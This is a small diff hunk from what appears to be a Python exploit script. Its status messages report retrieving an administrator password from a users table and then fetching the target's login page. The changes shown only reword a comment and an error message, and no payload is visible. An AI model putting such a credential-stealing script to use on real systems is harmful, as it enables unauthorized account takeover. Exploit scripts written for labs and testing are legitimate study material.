@@ -51,11 +51,11 @@ print(Fore.WHITE + "1. Retrieving administrator password from users table.. " +
         Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
 
 try:  
-    # fetch login page
+    # fetch the login page
     fetch_login = requests.get(f"{url}/login")
 
 except:
-    print(Fore.RED + "[!] Failed to fetch login page through exception")
+    print(Fore.RED + "[!] Failed to fetch the login page through exception")
     exit(1)
 
 print(Fore.WHITE + "2. Fetching login page.. " + Fore.GREEN + "OK")
